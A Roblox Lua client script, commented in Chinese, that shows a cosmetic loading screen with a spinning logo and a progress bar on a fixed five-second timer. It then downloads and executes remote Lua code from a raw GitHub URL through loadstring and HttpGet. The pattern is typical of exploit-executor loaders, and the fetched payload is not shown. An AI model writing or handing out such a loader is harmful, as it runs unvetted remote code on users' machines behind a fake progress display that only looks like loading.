-- 获取 PlayerGui
local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- 创建 ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FancyLoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

-- 创建半透明背景
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.BackgroundTransparency = 0.3
bg.Parent = screenGui

-- 添加中心 Logo
local logo = Instance.new("ImageLabel")
logo.Size = UDim2.new(0, 100, 0, 100)
logo.Position = UDim2.new(0.5, -50, 0.4, -50)
logo.BackgroundTransparency = 1
logo.Image = "rbxassetid://7072718368" -- 这里换成你自己的图片 ID
logo.Parent = bg

-- 创建进度条外框
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0, 400, 0, 30)
barBg.Position = UDim2.new(0.5, -200, 0.6, -15)
barBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
barBg.BorderSizePixel = 0
barBg.Parent = bg

local bgCorner = Instance.new("UICorner")
bgCorner.CornerRadius = UDim.new(0, 15)
bgCorner.Parent = barBg

-- 创建渐变进度条
local bar = Instance.new("Frame")
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BorderSizePixel = 0
bar.Parent = barBg

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(0, 15)
barCorner.Parent = bar

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 170))
}
gradient.Rotation = 0
gradient.Parent = bar

-- 创建百分比文字
local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(1, 0, 1, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextSize = 22
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.Parent = barBg

-- 让 Logo 旋转动画
task.spawn(function()
    while screenGui.Parent do
        logo.Rotation += 1
        wait(0.01)
    end
end)

-- 平滑加载动画
local duration = 5 -- 加载时间
local elapsed = 0
local step = 0.02

while elapsed < duration do
    elapsed += step
    local progress = math.clamp(elapsed / duration, 0, 1)
    bar.Size = UDim2.new(progress, 0, 1, 0)
    percentLabel.Text = string.format("%d%%", math.floor(progress * 100))
    wait(step)
end

bar.Size = UDim2.new(1, 0, 1, 0)
percentLabel.Text = "100%"

wait(0.5)

-- 执行外部脚本
local success, result = pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiao66778/xGB/refs/heads/main/1168.lua"))()
end)

if success then
    print("脚本加载成功！")
else
    warn("脚本加载失败：" .. tostring(result))
end

-- 清理
screenGui:Destroy()
